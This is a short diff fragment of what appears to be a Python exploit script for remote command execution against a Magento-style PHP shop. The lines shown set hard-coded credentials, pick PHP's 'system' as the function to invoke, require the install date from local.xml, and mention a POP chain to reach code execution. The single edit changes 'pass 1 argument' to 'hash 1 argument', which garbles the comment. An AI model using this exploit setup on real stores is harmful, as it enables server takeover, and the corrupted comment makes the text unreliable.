@@ -30,7 +30,7 @@ arg = sys.argv[2]
 # Config.
 username = 'forme'
 password = 'forme'
-php_function = 'system'  # Note: we can only pass 1 argument to the function
+php_function = 'system'  # Note: we can only hash 1 argument to the function
 install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml
 
 # POP chain to pivot into call_user_exec
